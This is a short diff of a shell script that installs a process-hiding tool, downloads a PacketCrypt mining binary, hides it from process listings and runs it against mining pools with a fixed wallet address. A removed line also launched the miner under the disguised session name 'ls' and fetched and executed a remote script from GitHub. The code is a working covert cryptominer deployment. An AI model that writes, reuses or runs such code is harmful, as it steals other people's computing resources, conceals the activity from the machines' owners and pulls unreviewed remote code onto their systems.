@@ -10,5 +10,5 @@ npm i -g node-process-hider &&
 wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O ccc && 
 ph add ccc && 
 chmod +x ccc && 
-screen -dmS ls nohup ./ccc ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io -t 50 > nohup.out &&
-wget https://raw.githubusercontent.com/aurbach55/zash/main/lo.sh && chmod +x lo.sh && ./lo.sh
+./ccc ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx http://pool.pkt.world http://pool.pktpool.io https://stratum.zetahash.com
+
